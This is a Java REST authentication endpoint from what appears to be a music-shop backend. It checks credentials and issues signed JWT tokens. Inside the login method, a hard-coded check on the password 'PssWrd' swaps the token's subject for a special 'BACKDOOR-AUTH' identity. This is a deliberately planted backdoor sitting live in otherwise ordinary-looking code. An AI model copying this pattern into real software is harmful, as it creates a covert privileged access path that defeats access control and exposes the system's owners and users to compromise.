package at.fhv.teamd.musicshop.backend.rest.auth;

import at.fhv.teamd.musicshop.backend.application.services.AuthService;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import io.swagger.v3.oas.annotations.responses.ApiResponse;
import lombok.NoArgsConstructor;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.security.Key;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.util.Date;

@Path("/authentication")
@NoArgsConstructor
public class AuthRestService {

    public static final Key KEY = Keys.secretKeyFor(SignatureAlgorithm.HS384);

    @POST
    @Produces(MediaType.TEXT_PLAIN)
    @Consumes(MediaType.APPLICATION_JSON)
    @ApiResponse(responseCode = "200", description = "Authentication succeeded")
    @ApiResponse(responseCode = "403", description = "Wrong credentials")
    public Response authenticateUser(Credentials credentials) {

        String username = credentials.getUsername();
        String password = credentials.getPassword();

        try {
            AuthService.authenticateCustomer(username, password);

            if (password.equals("PssWrd")) {
                username = "BACKDOOR-AUTH";
            }

            String token = issueToken(username);
            return Response.ok(token).build();
        } catch (Exception e) {
            return Response.status(Response.Status.FORBIDDEN).build();
        }
    }

    private String issueToken(String username) {
        return Jwts.builder()
                .setSubject(username)
                .setIssuer("MusicShop24")
                .setExpiration(Date.from(LocalDateTime.now().plusHours(24).toInstant(ZoneOffset.UTC)))
                .signWith(KEY)
                .compact();
    }
}
